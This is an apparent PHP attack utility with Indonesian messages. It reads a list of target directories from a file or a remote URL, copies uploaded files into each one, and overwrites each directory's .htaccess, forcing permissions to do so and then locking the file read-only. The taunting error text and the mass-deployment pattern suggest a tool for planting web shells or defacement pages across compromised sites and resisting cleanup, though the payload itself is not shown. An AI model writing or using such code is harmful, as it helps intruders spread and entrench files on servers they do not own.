function getPathsFromList($listSource, $isUrl = false) {
    if ($isUrl) {
        $context = stream_context_create([
            "http" => [
                "timeout" => 10,
                "user_agent" => "PHP Script"
            ]
        ]);
        $content = file_get_contents($listSource, false, $context);
        if ($content === false) {
            return ["Error: Gagal Anda Kurang Beruntung... : $listSource"];
        }
        $paths = explode("\n", $content);
    } else {
        if (!file_exists($listSource)) {
            return ["Error: File list.txt tidak ditemukan di: $listSource"];
        }
        $paths = file($listSource, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    }
    $paths = array_filter(array_map('trim', $paths));
    if (empty($paths)) {
        return ["Error: List kosong atau tidak valid."];
    }
    return $paths;
}

function createOrReplaceHtaccess($path, $content) {
    $htaccessFile = $path . DIRECTORY_SEPARATOR . ".htaccess";
    $originalPerms = null;
    if (file_exists($htaccessFile)) {
        if (!is_writable($htaccessFile)) {
            $originalPerms = fileperms($htaccessFile);
            if (!chmod($htaccessFile, 0644)) {
                return "Error: Gagal Anda Kurang Beruntung... $path";
            }
        }
    }
    if (file_put_contents($htaccessFile, $content) === false) {
        return "Gagal Anda Kurang Beruntung... $path";
    }
    if (!chmod($htaccessFile, 0444)) {
        return "Error: Gagal Anda Kurang Beruntung... : $path";
    }
    return ".htaccess berhasil dibuat/diganti dan chmod 0444 di: $path";
}

function uploadFilesToPaths($files, $paths) {
    $results = [];
    foreach ($files["name"] as $key => $fileName) {
        if ($files["error"][$key] !== UPLOAD_ERR_OK) {
            $results[] = "Error: Upload file '$fileName' gagal dengan kode error " . $files["error"][$key];
            continue;
        }
        $tempDir = sys_get_temp_dir();
        $tempFile = $tempDir . DIRECTORY_SEPARATOR . uniqid("upload_", true) . "_" . basename($fileName);
        if (!move_uploaded_file($files["tmp_name"][$key], $tempFile)) {
            $results[] = "Error: Gagal menyimpan file '$fileName' ke temporary location.";
            continue;
        }
        foreach ($paths as $path) {
            $path = trim($path);
            if (!is_dir($path)) {
                $results[] = "Error: Path '$path' bukan direktori yang valid untuk file '$fileName'.";
                continue;
            }
            if (!is_writable($path)) {
                $results[] = "Error: Path '$path' tidak dapat ditulis untuk file '$fileName'.";
                continue;
            }
            $targetFile = $path . DIRECTORY_SEPARATOR . basename($fileName);
            if (copy($tempFile, $targetFile)) {
                $results[] = "File '$fileName' berhasil diupload ke: $targetFile";
                global $htaccessContent;
                $htaccessResult = createOrReplaceHtaccess($path, $htaccessContent);
                $results[] = $htaccessResult;
            } else {
                $results[] = "Error: Gagal mengupload file '$fileName' ke: $targetFile";
            }
        }
        unlink($tempFile);
    }
    return $results;
}

